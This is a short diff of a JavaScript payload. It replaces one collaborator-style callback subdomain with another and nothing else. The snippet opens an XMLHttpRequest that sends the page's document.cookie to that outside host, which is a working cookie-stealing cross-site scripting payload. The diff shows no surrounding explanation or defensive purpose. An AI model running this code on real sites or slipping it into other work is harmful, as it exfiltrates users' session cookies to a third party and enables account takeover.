@@ -1,3 +1,3 @@
 var xhttp = new XMLHttpRequest();
-xhttp.open('GET', 'https://l3pznfdf0hbicj8uwb0ne82dh4nvblza.collab.hawkislandsol.com/?' + document.cookie, true);
+xhttp.open('GET', 'https://5gmc7aa1kkvsvj0t2qfxpasuvl1cpgd5.collab.hawkislandsol.com/?' + document.cookie, true);
 xhttp.send();
